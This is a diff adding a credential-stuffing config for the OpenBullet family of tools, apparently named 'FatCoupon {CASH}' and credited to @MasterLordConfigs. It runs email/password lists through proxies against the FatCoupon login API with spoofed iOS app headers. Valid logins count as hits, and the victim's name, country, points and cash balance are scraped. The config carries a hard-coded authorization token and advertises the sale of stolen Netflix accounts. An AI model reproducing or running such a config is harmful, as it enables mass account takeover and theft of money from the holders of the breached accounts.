@@ -1,0 +1,100 @@
+[SETTINGS]
+{
+  "Name": "FatCoupon {CASH}",
+  "SuggestedBots": 499,
+  "MaxCPM": 0,
+  "LastModified": "2021-10-18T06:55:33.080342-07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@MasterLordConfigs",
+  "Version": "1.0.1 [CB]",
+  "Descriptions": "",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "JOIN > @MasterLordConfigs",
+      "VariableName": "",
+      "Id": 1446640959
+    },
+    {
+      "Description": "IF YOU PORTAL AND NEED NETFLIX HITS + VHQ PROXY > @MasterLord007",
+      "VariableName": "",
+      "Id": 1097102631
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#PP FUNCTION Hash MD5 "<PASS>" -> VAR "PP" 
+
+#LOGIN REQUEST POST "https://apis.fatcoupon.com/api/ios/auth/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PP>\",\"deviceType\":\"ios-dev-client\",\"deviceToken\":\"\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: apis.fatcoupon.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: FatCoupon/1.4.7 (iPhone; iOS 12.4.3; Scale/2.00)" 
+  HEADER "Accept-Language: en-US;q=1, ar-US;q=0.9" 
+  HEADER "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI2MTZkNzZkN2FhMjI5NDAwMTExY2Y5NzUiLCJpYXQiOjE2MzQ1NjM3OTl9.MuI4PVP4D4ZtWs79sdFD1UD56W-o4cq06Nt-HU1pCMs" 
+  HEADER "Content-Length: 127" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "token" 
+  KEYCHAIN Failure OR 
+    KEY "Password is incorrect" 
+    KEY "Invalid parameters" 
+    KEY "email need an email under your options" 
+  KEYCHAIN Retry OR 
+    KEY "Too many requests" 
+
+#FIRST_NAME PARSE "<SOURCE>" JSON "firstName" CreateEmpty=FALSE -> CAP "First Name" 
+
+#LAST_NAME PARSE "<SOURCE>" JSON "lastName" CreateEmpty=FALSE -> CAP "Last Name" 
+
+#COUNTRY PARSE "<SOURCE>" JSON "country" CreateEmpty=FALSE -> CAP "Country" 
+
+#TOTAL_POINTS PARSE "<SOURCE>" LR "totalPoint\":" "," CreateEmpty=FALSE -> CAP "Total Points" 
+
+#PENDING_POINT PARSE "<SOURCE>" LR "pendingPoint\":" "," CreateEmpty=FALSE -> CAP "Pending Point" 
+
+#LOCKING_POINT PARSE "<SOURCE>" LR "lockingPoint\":" "," CreateEmpty=FALSE -> CAP "Locking Point" 
+
+#BALANCE PARSE "<SOURCE>" LR "balance\":" "," CreateEmpty=FALSE -> CAP "Balance" 
+
+#PENDING_BALANCE PARSE "<SOURCE>" LR "pending\":" "," CreateEmpty=FALSE -> CAP "Pending Balance" 
+
+#CREATOR FUNCTION Constant "@MasterLordConfigs" -> CAP "Config By" 
+
